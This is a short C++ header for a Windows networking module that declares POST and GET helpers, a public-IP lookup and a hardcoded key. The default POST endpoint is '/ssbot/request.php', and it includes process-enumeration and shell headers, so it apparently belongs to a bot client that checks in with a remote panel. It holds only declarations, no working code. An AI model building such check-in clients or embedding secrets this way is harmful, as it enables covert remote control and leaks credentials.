#ifndef WEBSERVER_H
#define WEBSERVER_H

#ifndef NTDDI_VERSION
#define NTDDI_VERSION NTDDI_VISTA
#endif
#ifndef WINVER
#define WINVER _WIN32_WINNT_VISTA
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT _WIN32_WINNT_VISTA
#endif
#include <Ws2tcpip.h>
#include <iostream>
#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <winsock2.h>
#include <sys/time.h>
#include <windows.h>
#include <stdlib.h>
#include <string>
#include <tchar.h>
#include <tlhelp32.h>
#include <vector>
#include <sstream>
#include <shellapi.h>
#include <math.h>
#include <algorithm>
#include <fstream>
#include <ctime>
#include <unistd.h>
#include <sstream>
#include <conio.h>
#include <thread>
#include <dirent.h>
#include <bitset>
#include <mutex>
#include <random>
#include <chrono>
#include <future>
#include <list>
#include "../Shared code/Helpers.h"

#define WEBSERVERKEY "iLikeGirls528"
using namespace std;

namespace WebServer {
extern string address, useragent;
extern int port;
extern string publicIP;

bool POST(string data, string* receiver, string target = "/ssbot/request.php");
bool GET(string hostname, string* receiver);
bool GetPublicIP();
}
#endif // WEBSERVER_H
